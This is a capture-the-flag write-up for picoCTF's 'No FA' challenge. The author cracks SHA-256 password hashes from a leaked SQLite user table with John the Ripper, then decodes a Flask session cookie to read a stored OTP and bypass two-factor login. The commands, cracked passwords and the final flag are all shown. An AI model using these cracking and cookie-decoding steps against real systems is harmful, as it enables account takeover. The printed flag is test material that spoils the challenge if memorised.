# No FA

First I saw that the users.db is a sqlite3 file. So I opened it and fount that it has only one table named users.
```sql
SELECT * FROM users;
```
And I got this:
```
1|john.doe|john.doe@nfa.com|599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1|0
2|jane.smith|jane.smith@nfa.com|81c68634d1b211e0d5632839f7efc8601c743f1ef0c94da8220e26ab221efff1|0
3|robert.jones|robert.jones@nfa.com|aaf120fcb16e20e2d18e63e668e060b5e4a52c5e0b3f038777365fe87ca2ccdb|0
4|emily.brown|emily.brown@nfa.com|9e85668a071a595fe9222725bfb591cdaa0d880e3a7c7de1d9ddd3d4b7d08772|0
5|admin|iamadmin@nfs.com|c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67|1
6|michael.davis|michael.davis@nfa.com|576454d8921440f30609200a7f79073ec5b69ee284f27bbb860620d56416ad94|0
7|linda.wilson|linda.wilson@nfa.com|082a6006d9c87749adff6be260461171b508744a90a45f75abe78d92995485c5|0
8|david.garcia|david.garcia@nfa.com|faa32a09d4798d21486344a140fd0977cbec33fd5b045bca83c04efb364c49d9|0
9|jennifer.rodriguez|jennifer.rodriguez@nfa.com|c1488b6d9ed8352a64f979506583f33d80aa4119190f7892bc481e8984c880d0|0
10|christopher.williams|christopher.williams@nfa.com|0bf3a14c03e9c7034b9588a69f828840fd32bd739c37b613f41c4aecee26e277|0
11|angela.martinez|angela.martinez@nfa.com|e64b5893827166e4568af8ece105d8c0839772ae10fba3c11e77b5fb3c0ef0c6|0
12|kevin.anderson|kevin.anderson@nfa.com|8bac48021ebd453dbd876d43fa28c8e383fc16176fc8b12fa474b01eb9fa4df5|0
13|melissa.thomas|melissa.thomas@nfa.com|564c89c28d93e8485b76a41deca21ab28e60a32c506e479b925f4643722e9f83|0
14|brian.jackson|brian.jackson@nfa.com|7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2|0
15|stephanie.white|stephanie.white@nfa.com|64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b|0
16|eric.harris|eric.harris@nfa.com|b9590eaeaa25401398ebd4b98e10182f4e265f396f23a11eb8fdb18d66a1685c|0
17|michelle.martin|michelle.martin@nfa.com|9b68124e23f3bb700682d28d1d750bec95794a193097b59526ef038f810cb34c|0
18|patrick.thompson|patrick.thompson@nfa.com|1549f62e486c006cbbacee5947c3f6815a0c5f3ef54c80f1f0b17c2ae9da5866|0
19|nicole.garrett|nicole.garrett@nfa.com|5647517c88d64c95170fdb734dc22ba45e284f219d1266eb14f4d9dd7a099ce3|0
20|joseph.cole|joseph.cole@nfa.com|49a57175de704a0ec2a006746d20d375814581bb35552ce0a0b13683426fd232|0
```

So I saw the first guy is named john and since we know this are sha256 hashes we can save the hash for his password in a file named hash.txt and run this command on it:
```sh
john --format=raw-sha256 hash.txt --wordlist=/home/ileab/Wordlists/rockyou.txt
```

I logged in with the password john gave me and got the message that the flag is not here for me.
So I put all of this in hash.txt and ran john on it:
```
john.doe:599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1
jane.smith:81c68634d1b211e0d5632839f7efc8601c743f1ef0c94da8220e26ab221efff1
robert.jones:aaf120fcb16e20e2d18e63e668e060b5e4a52c5e0b3f038777365fe87ca2ccdb
emily.brown:9e85668a071a595fe9222725bfb591cdaa0d880e3a7c7de1d9ddd3d4b7d08772
admin:c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
michael.davis:576454d8921440f30609200a7f79073ec5b69ee284f27bbb860620d56416ad94
linda.wilson:082a6006d9c87749adff6be260461171b508744a90a45f75abe78d92995485c5
david.garcia:faa32a09d4798d21486344a140fd0977cbec33fd5b045bca83c04efb364c49d9
jennifer.rodriguez:c1488b6d9ed8352a64f979506583f33d80aa4119190f7892bc481e8984c880d0
christopher.williams:0bf3a14c03e9c7034b9588a69f828840fd32bd739c37b613f41c4aecee26e277
angela.martinez:e64b5893827166e4568af8ece105d8c0839772ae10fba3c11e77b5fb3c0ef0c6
kevin.anderson:8bac48021ebd453dbd876d43fa28c8e383fc16176fc8b12fa474b01eb9fa4df5
melissa.thomas:564c89c28d93e8485b76a41deca21ab28e60a32c506e479b925f4643722e9f83
brian.jackson:7fccba2f216750414443626058128539ef5a8859f7cb20da2b22d8d787ec6fc2
stephanie.white:64acea3bdefef67d65e6a36ee66ac66e85d39931639ea926d1fc98fedd28905b
eric.harris:b9590eaeaa25401398ebd4b98e10182f4e265f396f23a11eb8fdb18d66a1685c
michelle.martin:9b68124e23f3bb700682d28d1d750bec95794a193097b59526ef038f810cb34c
patrick.thompson:1549f62e486c006cbbacee5947c3f6815a0c5f3ef54c80f1f0b17c2ae9da5866
nicole.garrett:5647517c88d64c95170fdb734dc22ba45e284f219d1266eb14f4d9dd7a099ce3
joseph.cole:49a57175de704a0ec2a006746d20d375814581bb35552ce0a0b13683426fd232
```

```sh
john --format=raw-sha256 hash.txt --wordlist=/home/ileab/Wordlists/rockyou.txt
john --format=raw-sha256 --show hash.txt
```

Output:
```
john.doe:apple123
admin:apple@123
```

When I logged in with admin I got some OTP message prompt. 

After inspecting the source code I saw this interesting part:
```python
otp = request.form['otp']
stored_otp = session['otp_secret']
timestamp = session.get('otp_timestamp')
if stored_otp and otp == stored_otp and (time.time() - timestamp) < 120:
    session['logged'] = 'true'
    flash('Login successful!', 'green')
    return redirect(url_for('home'))
```
From my understanding I get that the session is my cookie and it checks the otp code from my cookie.

My cookie: `.eJwty0sKgCAQANC7zFqiLJ30MiE5ieAPtVV091y0ffAeCNk5sqDhMqERMMi9HI3OSn2gUCv-1n2k1k0soBdEgXJTcp642CVHZHA3qslEGsnY6BO8H0j4HHQ.adgF5Q.7Hx6f5vzzWAWqpwJJbG6cW2-sDY`

```sh
flask-unsign --decode --cookie '.eJwty0sKgCAQANC7zFqiLJ30MiE5ieAPtVV091y0ffAeCNk5sqDhMqERMMi9HI3OSn2gUCv-1n2k1k0soBdEgXJTcp642CVHZHA3qslEGsnY6BO8H0j4HHQ.adgF5Q.7Hx6f5vzzWAWqpwJJbG6cW2-sDY'

```
Output:
```
{'logged': 'false', 'otp_secret': '5937', 'otp_timestamp': 1775764960.2586277, 'username': 'admin'}
```
So my otp code is: 5937.

After entering the number I got the flag.

flag: `picoCTF{n0_r4t3_n0_4uth_487507fc}`